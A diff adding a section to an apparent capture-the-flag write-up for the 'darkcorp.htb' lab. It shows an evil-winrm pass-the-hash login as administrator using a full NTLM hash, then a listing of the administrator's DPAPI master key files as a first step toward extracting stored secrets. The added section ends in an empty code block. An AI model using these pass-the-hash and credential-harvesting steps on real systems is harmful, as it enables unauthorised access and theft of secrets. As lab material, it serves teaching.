@@ -1061,7 +1061,40 @@ I can also dump the SAM
 # Access as administrator on WINRM (`web-01`)
 
 ```python
+evil-winrm -i web-01.darkcorp.htb -u administrator -H '88d84ec08dad123eb04a060a74053f21'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
 
+I now have access as the administrator
+
+# Extraciting DPAPI secrets
+
+```python
+*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500> dir -force
+
+
+    Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-         1/15/2025   4:11 PM            468 189c6409-5515-4114-81d2-6dde4d6912ce
+-a-hs-         1/16/2025  10:35 AM            468 6037d071-cac5-481e-9e08-c4296c0a7ff7
+-a-hs-         9/10/2026   9:19 AM            468 f22d8b80-b64e-4aea-bc67-662aaca5aa41
+-a-hs-         9/10/2026   9:19 AM             24 Preferred
+```
+
+I have found 3 keys
+
+```py
 ```
 
 
